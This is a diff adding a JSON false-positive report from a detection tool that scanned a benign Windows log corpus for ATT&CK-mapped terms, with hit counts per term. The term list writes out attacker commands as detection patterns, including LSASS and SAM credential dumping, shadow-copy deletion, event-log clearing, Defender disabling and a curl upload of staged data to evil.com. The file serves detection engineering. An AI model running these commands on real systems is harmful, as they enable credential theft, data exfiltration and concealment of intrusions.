@@ -1,0 +1,6307 @@
+{
+  "corpus": "Evidence-files\\_k1-datasets\\benign",
+  "events_scanned": 26914,
+  "events_skipped_by_cap": 1591681,
+  "files_scanned": 1026,
+  "files_unreadable": 0,
+  "max_events_per_file": 300,
+  "max_file_rate": 0.05,
+  "noisy_terms": [
+    "1",
+    "5",
+    "10",
+    "11",
+    "13",
+    "19",
+    "22"
+  ],
+  "terms": [
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1219 TeamViewer",
+      "techniques": [
+        "T1219"
+      ],
+      "term": "--daemon"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1219 AnyDesk",
+      "techniques": [
+        "T1219"
+      ],
+      "term": "--install"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1486 Ransomware simulation",
+      "techniques": [
+        "T1486"
+      ],
+      "term": ".locked"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1078 Whoami /all",
+      "techniques": [
+        "T1078"
+      ],
+      "term": "/all"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1021 WMI lateral",
+      "techniques": [
+        "T1021"
+      ],
+      "term": "/node:"
+    },
+    {
+      "events_hit": 28,
+      "file_rate": 0.0049,
+      "files_hit": 5,
+      "kind": "artifact",
+      "subject": "T1070 Clear event logs",
+      "techniques": [
+        "T1070"
+      ],
+      "term": "1102"
+    },
+    {
+      "events_hit": 242,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "artifact",
+      "subject": "T1059.001 Encoded command",
+      "techniques": [
+        "T1059.001"
+      ],
+      "term": "4104"
+    },
+    {
+      "events_hit": 316,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "artifact",
+      "subject": "T1021 PsExec",
+      "techniques": [
+        "T1021"
+      ],
+      "term": "4624"
+    },
+    {
+      "events_hit": 8,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "artifact",
+      "subject": "T1110.001 RDP brute force",
+      "techniques": [
+        "T1110.001"
+      ],
+      "term": "4625"
+    },
+    {
+      "events_hit": 4,
+      "file_rate": 0.0039,
+      "files_hit": 4,
+      "kind": "artifact",
+      "subject": "T1003.001 Procdump",
+      "techniques": [
+        "T1003.001"
+      ],
+      "term": "4656"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1547.001 Run key",
+      "techniques": [
+        "T1547.001"
+      ],
+      "term": "4657"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1003.001 Procdump",
+      "techniques": [
+        "T1003.001"
+      ],
+      "term": "4663"
+    },
+    {
+      "events_hit": 69,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "artifact",
+      "subject": "T1059.001 Encoded command",
+      "techniques": [
+        "T1059.001"
+      ],
+      "term": "4688"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1543.003 Sc create",
+      "techniques": [
+        "T1543.003"
+      ],
+      "term": "4697"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1053.005 Schtasks create",
+      "techniques": [
+        "T1053.005"
+      ],
+      "term": "4698"
+    },
+    {
+      "events_hit": 2,
+      "file_rate": 0.001,
+      "files_hit": 1,
+      "kind": "artifact",
+      "subject": "T1110.001 RDP brute force",
+      "techniques": [
+        "T1110.001"
+      ],
+      "term": "4776"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1070 Disable Defender",
+      "techniques": [
+        "T1070"
+      ],
+      "term": "5001"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1021 PsExec",
+      "techniques": [
+        "T1021"
+      ],
+      "term": "5140"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1021 PsExec",
+      "techniques": [
+        "T1021"
+      ],
+      "term": "5145"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1059.001 Download cradle",
+      "techniques": [
+        "T1059.001"
+      ],
+      "term": "5156"
+    },
+    {
+      "events_hit": 11,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "artifact",
+      "subject": "T1546.003 WMI persistence",
+      "techniques": [
+        "T1546.003"
+      ],
+      "term": "5861"
+    },
+    {
+      "events_hit": 24,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "artifact",
+      "subject": "T1059.003 Service creation",
+      "techniques": [
+        "T1059.003"
+      ],
+      "term": "7045"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1053.005 Schtasks create",
+      "techniques": [
+        "T1053.005"
+      ],
+      "term": "\\Windows\\System32\\Tasks\\TestTask"
+    },
+    {
+      "events_hit": 17,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "artifact",
+      "subject": "T1546.003 WMI persistence",
+      "techniques": [
+        "T1546.003"
+      ],
+      "term": "__EventFilter"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1021 PsExec",
+      "techniques": [
+        "T1021"
+      ],
+      "term": "admin$"
+    },
+    {
+      "events_hit": 46,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "artifact",
+      "subject": "T1078 Net localgroup",
+      "techniques": [
+        "T1078"
+      ],
+      "term": "administrators"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1219 AnyDesk",
+      "techniques": [
+        "T1219"
+      ],
+      "term": "anydesk.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1053.005 At.exe",
+      "techniques": [
+        "T1053.005"
+      ],
+      "term": "at.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1490 Bcdedit",
+      "techniques": [
+        "T1490"
+      ],
+      "term": "bcdedit.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1490 Bcdedit",
+      "techniques": [
+        "T1490"
+      ],
+      "term": "bootstatuspolicy"
+    },
+    {
+      "events_hit": 78,
+      "file_rate": 0.0078,
+      "files_hit": 8,
+      "kind": "artifact",
+      "subject": "T1059.003 Cmd execution",
+      "techniques": [
+        "T1059.003"
+      ],
+      "term": "cmd.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1074 Compress staging",
+      "techniques": [
+        "T1074"
+      ],
+      "term": "Compress-Archive"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1003.001 Comsvcs MiniDump",
+      "techniques": [
+        "T1003.001"
+      ],
+      "term": "comsvcs.dll"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1059.003 Service creation",
+      "techniques": [
+        "T1059.003"
+      ],
+      "term": "CreateService"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1048 Curl exfil",
+      "techniques": [
+        "T1048"
+      ],
+      "term": "curl.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1082 Nltest",
+      "techniques": [
+        "T1082"
+      ],
+      "term": "dclist"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1552 Registry credentials",
+      "techniques": [
+        "T1552"
+      ],
+      "term": "DefaultPassword"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1070 Disable Defender",
+      "techniques": [
+        "T1070"
+      ],
+      "term": "DisableRealtimeMonitoring"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1082 Net group",
+      "techniques": [
+        "T1082"
+      ],
+      "term": "Domain Admins"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1003.001 Comsvcs MiniDump",
+      "techniques": [
+        "T1003.001"
+      ],
+      "term": "dump.bin"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1003.002 Esentutl",
+      "techniques": [
+        "T1003.002"
+      ],
+      "term": "esentutl.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1552 Unattend.xml",
+      "techniques": [
+        "T1552"
+      ],
+      "term": "findstr.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1048 FTP exfil",
+      "techniques": [
+        "T1048"
+      ],
+      "term": "ftp.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1048 FTP exfil",
+      "techniques": [
+        "T1048"
+      ],
+      "term": "ftp.txt"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1134 Token impersonation",
+      "techniques": [
+        "T1134"
+      ],
+      "term": "Impersonate"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1110.001 RDP brute force",
+      "techniques": [
+        "T1110.001"
+      ],
+      "term": "ipc$"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1003.001 Procdump",
+      "techniques": [
+        "T1003.001"
+      ],
+      "term": "lsass.dmp"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1567.002 Mega",
+      "techniques": [
+        "T1567.002"
+      ],
+      "term": "mega-cmd.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1567.002 Mega",
+      "techniques": [
+        "T1567.002"
+      ],
+      "term": "mega.nz"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1003.001 Nanodump",
+      "techniques": [
+        "T1003.001"
+      ],
+      "term": "nanodump.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1059.003 Net user enumeration",
+      "techniques": [
+        "T1059.003"
+      ],
+      "term": "net user"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1059.003 Net user enumeration",
+      "techniques": [
+        "T1059.003"
+      ],
+      "term": "net.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1082 Nltest",
+      "techniques": [
+        "T1082"
+      ],
+      "term": "nltest.exe"
+    },
+    {
+      "events_hit": 64,
+      "file_rate": 0.0019,
+      "files_hit": 2,
+      "kind": "artifact",
+      "subject": "T1003.003 Ntdsutil",
+      "techniques": [
+        "T1003.003"
+      ],
+      "term": "ntds.dit"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1003.003 Ntdsutil",
+      "techniques": [
+        "T1003.003"
+      ],
+      "term": "ntdsutil.exe"
+    },
+    {
+      "events_hit": 159,
+      "file_rate": 0.0136,
+      "files_hit": 14,
+      "kind": "artifact",
+      "subject": "T1552 Unattend.xml",
+      "techniques": [
+        "T1552"
+      ],
+      "term": "password"
+    },
+    {
+      "events_hit": 84,
+      "file_rate": 0.0068,
+      "files_hit": 7,
+      "kind": "artifact",
+      "subject": "T1059.001 Encoded command",
+      "techniques": [
+        "T1059.001"
+      ],
+      "term": "powershell.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1003.001 Procdump",
+      "techniques": [
+        "T1003.001"
+      ],
+      "term": "procdump.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1021 PsExec",
+      "techniques": [
+        "T1021"
+      ],
+      "term": "psexesvc.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1567.002 Rclone",
+      "techniques": [
+        "T1567.002"
+      ],
+      "term": "rclone.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1003.002 Reg save SAM",
+      "techniques": [
+        "T1003.002"
+      ],
+      "term": "reg.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1567.002 Rclone",
+      "techniques": [
+        "T1567.002"
+      ],
+      "term": "remote:backup"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1003.002 Reg save SAM",
+      "techniques": [
+        "T1003.002"
+      ],
+      "term": "sam.hive"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1003.002 Esentutl",
+      "techniques": [
+        "T1003.002"
+      ],
+      "term": "sam_copy"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1059.003 Service creation",
+      "techniques": [
+        "T1059.003"
+      ],
+      "term": "sc.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1053.005 Schtasks create",
+      "techniques": [
+        "T1053.005"
+      ],
+      "term": "schtasks.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1059.001 Encoded command",
+      "techniques": [
+        "T1059.001"
+      ],
+      "term": "ScriptBlock"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1070 Delete shadow copies",
+      "techniques": [
+        "T1070"
+      ],
+      "term": "shadow"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1003.003 Vssadmin NTDS",
+      "techniques": [
+        "T1003.003"
+      ],
+      "term": "shadow copy"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1074 Compress staging",
+      "techniques": [
+        "T1074"
+      ],
+      "term": "staged.zip"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1547.001 Startup folder",
+      "techniques": [
+        "T1547.001"
+      ],
+      "term": "Startup"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1070 Clear event logs",
+      "techniques": [
+        "T1070"
+      ],
+      "term": "System"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1082 Systeminfo",
+      "techniques": [
+        "T1082"
+      ],
+      "term": "systeminfo.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1219 TeamViewer",
+      "techniques": [
+        "T1219"
+      ],
+      "term": "teamviewer.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1547.001 Startup folder",
+      "techniques": [
+        "T1547.001"
+      ],
+      "term": "test.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1547.001 Run key",
+      "techniques": [
+        "T1547.001"
+      ],
+      "term": "TestKey"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1543.003 Sc create",
+      "techniques": [
+        "T1543.003"
+      ],
+      "term": "TestSvc"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1552 Unattend.xml",
+      "techniques": [
+        "T1552"
+      ],
+      "term": "unattend.xml"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1003.003 Vssadmin NTDS",
+      "techniques": [
+        "T1003.003"
+      ],
+      "term": "vssadmin.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1070 Clear event logs",
+      "techniques": [
+        "T1070"
+      ],
+      "term": "wevtutil.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1059.003 Cmd execution",
+      "techniques": [
+        "T1059.003"
+      ],
+      "term": "whoami"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1078 Whoami /all",
+      "techniques": [
+        "T1078"
+      ],
+      "term": "whoami.exe"
+    },
+    {
+      "events_hit": 356,
+      "file_rate": 0.0049,
+      "files_hit": 5,
+      "kind": "artifact",
+      "subject": "T1021 WinRM",
+      "techniques": [
+        "T1021"
+      ],
+      "term": "winrm"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1021 WinRM",
+      "techniques": [
+        "T1021"
+      ],
+      "term": "winrs.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "artifact",
+      "subject": "T1546.003 WMI persistence",
+      "techniques": [
+        "T1546.003"
+      ],
+      "term": "wmic.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1070 Disable Defender",
+      "techniques": [
+        "T1070"
+      ],
+      "term": "-DisableRealtimeMonitoring"
+    },
+    {
+      "events_hit": 32,
+      "file_rate": 0.001,
+      "files_hit": 1,
+      "kind": "command",
+      "subject": "T1059.001 Download cradle",
+      "techniques": [
+        "T1059.001"
+      ],
+      "term": "-nop"
+    },
+    {
+      "events_hit": 16,
+      "file_rate": 0.0019,
+      "files_hit": 2,
+      "kind": "command",
+      "subject": "T1074 Compress staging",
+      "techniques": [
+        "T1074"
+      ],
+      "term": "-Path"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1219 AnyDesk",
+      "techniques": [
+        "T1219"
+      ],
+      "term": "anydesk.exe --install"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1053.005 At.exe",
+      "techniques": [
+        "T1053.005"
+      ],
+      "term": "at.exe 13:37 /interactive cmd.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1490 Bcdedit",
+      "techniques": [
+        "T1490"
+      ],
+      "term": "bcdedit /set {default} bootstatuspolicy ignoreallfailures"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1059.003 Service creation",
+      "techniques": [
+        "T1059.003"
+      ],
+      "term": "C:\\test.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1071 HTTP beacon",
+      "techniques": [
+        "T1071"
+      ],
+      "term": "catch{};Start-Sleep"
+    },
+    {
+      "events_hit": 78,
+      "file_rate": 0.0078,
+      "files_hit": 8,
+      "kind": "command",
+      "subject": "T1059.003 Service creation",
+      "techniques": [
+        "T1059.003"
+      ],
+      "term": "cmd.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1059.003 Net user enumeration",
+      "techniques": [
+        "T1059.003"
+      ],
+      "term": "cmd.exe /c net user"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1059.003 Cmd execution",
+      "techniques": [
+        "T1059.003"
+      ],
+      "term": "cmd.exe /c whoami"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1074 Compress staging",
+      "techniques": [
+        "T1074"
+      ],
+      "term": "Compress-Archive"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1048 Curl exfil",
+      "techniques": [
+        "T1048"
+      ],
+      "term": "curl.exe -T staged.zip http://evil.com/upload"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1003.002 Esentutl",
+      "techniques": [
+        "T1003.002"
+      ],
+      "term": "esentutl.exe /y %SystemRoot%\\System32\\config\\SAM /d sam_copy"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1552 Unattend.xml",
+      "techniques": [
+        "T1552"
+      ],
+      "term": "findstr /si password C:\\Windows\\Panther\\unattend.xml"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1486 Ransomware simulation",
+      "techniques": [
+        "T1486"
+      ],
+      "term": "ForEach-Object"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1048 FTP exfil",
+      "techniques": [
+        "T1048"
+      ],
+      "term": "ftp.exe -s:ftp.txt"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1486 Ransomware simulation",
+      "techniques": [
+        "T1486"
+      ],
+      "term": "Get-ChildItem"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1567.002 Mega",
+      "techniques": [
+        "T1567.002"
+      ],
+      "term": "mega-cmd.exe put C:\\sensitive"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1547.001 Startup folder",
+      "techniques": [
+        "T1547.001"
+      ],
+      "term": "Menu\\Programs\\Startup\\test.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1003.001 Nanodump",
+      "techniques": [
+        "T1003.001"
+      ],
+      "term": "nanodump.exe --pid <lsass_pid> --write dump.bin"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1082 Net group",
+      "techniques": [
+        "T1082"
+      ],
+      "term": "net group \"Domain Admins\" /domain"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1078 Net localgroup",
+      "techniques": [
+        "T1078"
+      ],
+      "term": "net localgroup administrators"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1059.001 Download cradle",
+      "techniques": [
+        "T1059.001"
+      ],
+      "term": "New-Object"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1082 Nltest",
+      "techniques": [
+        "T1082"
+      ],
+      "term": "nltest /dclist:domain.local"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1003.003 Ntdsutil",
+      "techniques": [
+        "T1003.003"
+      ],
+      "term": "ntdsutil.exe"
+    },
+    {
+      "events_hit": 84,
+      "file_rate": 0.0068,
+      "files_hit": 7,
+      "kind": "command",
+      "subject": "T1059.001 Download cradle",
+      "techniques": [
+        "T1059.001"
+      ],
+      "term": "powershell.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1059.001 Encoded command",
+      "techniques": [
+        "T1059.001"
+      ],
+      "term": "powershell.exe -enc <base64>"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1003.001 Procdump",
+      "techniques": [
+        "T1003.001"
+      ],
+      "term": "procdump -ma lsass.exe lsass.dmp"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1021 PsExec",
+      "techniques": [
+        "T1021"
+      ],
+      "term": "psexec.exe \\\\target -s cmd.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1567.002 Rclone",
+      "techniques": [
+        "T1567.002"
+      ],
+      "term": "rclone.exe copy C:\\sensitive remote:backup"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1003.002 Reg save SAM",
+      "techniques": [
+        "T1003.002"
+      ],
+      "term": "reg save HKLM\\SAM sam.hive"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1003.001 Comsvcs MiniDump",
+      "techniques": [
+        "T1003.001"
+      ],
+      "term": "rundll32.exe comsvcs.dll MiniDump <lsass_pid> dump.bin full"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1543.003 Sc create",
+      "techniques": [
+        "T1543.003"
+      ],
+      "term": "sc.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1070 Disable Defender",
+      "techniques": [
+        "T1070"
+      ],
+      "term": "Set-MpPreference"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1082 Systeminfo",
+      "techniques": [
+        "T1082"
+      ],
+      "term": "systeminfo.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1219 TeamViewer",
+      "techniques": [
+        "T1219"
+      ],
+      "term": "teamviewer.exe --daemon"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1547.001 Startup folder",
+      "techniques": [
+        "T1547.001"
+      ],
+      "term": "test.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1003.003 Vssadmin NTDS",
+      "techniques": [
+        "T1003.003"
+      ],
+      "term": "vssadmin create shadow /for=C:"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1070 Delete shadow copies",
+      "techniques": [
+        "T1070"
+      ],
+      "term": "vssadmin delete shadows /for=C: /quiet"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1070 Clear event logs",
+      "techniques": [
+        "T1070"
+      ],
+      "term": "wevtutil cl System"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
+      "subject": "T1078 Whoami /all",
+      "techniques": [
+        "T1078"
+      ],
+      "term": "whoami.exe /all"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "command",
